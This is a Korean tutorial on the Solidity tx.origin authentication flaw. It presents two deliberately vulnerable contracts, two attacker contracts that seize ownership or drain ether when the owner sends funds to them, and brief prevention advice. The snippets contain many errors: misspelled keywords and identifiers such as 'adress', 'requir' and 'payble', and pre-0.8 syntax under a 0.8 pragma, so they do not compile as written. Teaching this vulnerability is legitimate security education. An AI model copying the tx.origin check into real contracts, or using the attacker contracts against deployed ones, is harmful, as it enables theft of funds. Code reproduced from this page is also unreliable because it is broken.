# Tx.origin Authentication (소유자 인증)

## **tx.origin과 msg.sender**

- tx.origin : 트랜잭션을 처음 시작한 계정(항상 EOA)
- msg.sender : 트랜잭션을 처음 시작한 계정 or 중간에 컨트랙트를 경유할 경우 컨트랙트 계정으로 바뀔 수 있음

## **tx.origin == msg.sender (x)**

tx.origin과 msg.sender가 동일하다고 생각하고 tx.origin을 권한 검사에 사용하는것은 위험합니다.

**보안 취약 컨트랙트 1**

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract MyContract {
    
    address owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(owner == tx.origin, "Caller is not the onwner");
        _;
    }

    function transfer(adress _addr) {
        _addr.tansfer(this.balance);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}
```

- transferOwnership() 함수를 실핼할 수 있는 것은 onlyOwner를 통과한 계정으로 제한됩니다.
- 그런데 require문에서는 owner를 tx.origin과 비교하고 있습니다.
- 공격자는 다음과 같은 컨트랙트를 작성할 수 있습니다.

**공격자 컨트랙트 1**

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Attacker {
    address badUser;
    MyContract target;

    constructor(address _addr) {
        badUser = msg.sender;
        target = MyContract(_addr);
    }

    receive() external payable {
        target.transferOwnership(badUser);
    }
}
```

- 공격자가 MyContract의 배포 계정이 Attacker 컨트랙트에게 이더를 전송하도록 유도하여 성공한다면 receice() 함수가 받으면서 transferOwnership()이 실행될 것이고, tx.origin은 배포 계정이 됩니다.
- 따라서 modifier onluOwner를 무사히 통과하여 파라미터로 전달된 badUser계정이 owner가 됩니다.

![https://github.com/lhn1455/TIL/raw/main/Solidity/Solidity-Docs/img/txorigin.png](https://github.com/lhn1455/TIL/raw/main/Solidity/Solidity-Docs/img/txorigin.png)

**보안 취약 컨트랙트 2**

```solidity
contract Phishable {
    address owner;

    constructor (address _owner) {
        owner = _owner;
    }

    function () public payable {} // collect ether

    function withdrawAll(address _recipient) public {
        requir(tx.origin == owner); // 소유자 인증 후 수금자에게 모든 ether를 전송
        _recipient.transfer(this.balance);
    }
}
```

- require문 코드로 소유자를 인증 후 수금자에게 모든 이더를 송금하는 컨트랙트 입니다.

**공격자 컨트랙트 2**

```solidity
import "Phishable.sol"

contract AttackContract {
    Phishable phisableContract;
    address attacker; //송금 받을 공격자 계정

    constructor (Phishable _phishableContract, address _attackerAddress) {
        phisableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () payble {
        phisableContract.withdrawAll(attacker);
    }
}
```

- 공격자는 Phishable 컨트랙트를 자신의 주소로 위장하여 owner를 변경하고 ether를 탈취할 수 있습니다.

**예방 기법**

- tx.origin으로 계약을 승인하면 안됩니다.
- tx.origin을 이용할 경우 `require(tx.origin == msg.sender);` 이렇게 구현해야 합니다.